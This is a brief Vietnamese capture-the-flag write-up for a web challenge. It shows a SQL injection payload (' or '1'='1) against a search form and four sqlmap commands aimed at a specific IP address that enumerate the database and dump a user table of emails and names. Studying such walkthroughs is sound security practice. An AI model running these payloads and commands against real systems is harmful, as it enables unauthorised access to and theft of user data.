- tiêu đề : web2

- tiếp tục challenges sau khi khởi động web1 

![Alt text](<./img/2.1.png>)

- okay giờ có 1 tính năng tìm kiếm ròi: mình thử 1 số input thì nghĩ là đây là tính năng xem người dùng tồn tại chưa : 
   + nếu có kết quả thì trả về username exist 
   + không thì là data not found 

- nhưng không dừng lại ở đó :> sau khi thêm 1 vài phép thử như dấu ' thì có văng ra cả input error ở chỗ dấu * 
- mình test thử payload sqli : ' or '1'='1 và thành công trả về usernam exist       

![Alt text](<./img/2.3.png>)

- hôm mình làm thì code mà th nay viết wu dùng tool cho lẹ 

- mình để lại lệnh nhé vì bài này cũng không có gì lắm nên lười làm lại :v 

bước 1 : sqlmap -u "http://14.225.255.180:5000/index.php" --data="search=1&save=" --method POST --level 5 --risk 3 --batch --dbs
-> sẽ kiếm được cái dtb là IDC hay sao é :v ( mình không nhớ rõ tên có gì sửa cái IDC đi nhá)
bước 2 : sqlmap -u "http://14.225.255.180:5000/index.php" --data="search=1&save=" --method POST --level 5 --risk 3 --batch -D IDC --tables
-> kiếm được tables là user
bước 3 : sqlmap -u "http://14.225.255.180:5000/index.php" --data="search=1&save=" --method POST --level 5 --risk 3 --batch -D IDC -T user --columns 
-> lấy được 4 trường : email , name , id , hidden 
bước 4 : sqlmap -u "http://14.225.255.180:5000/index.php" --data="search=1&save=" --method POST --level 5 --risk 3 --batch -D IDC -T user -C email,name,id,hidden --dump

- đợi tẹo là có flag nhá :> 

#hackerga2101: hehe lại là hackerga2101 và phi vụ thi lậu ở các trường
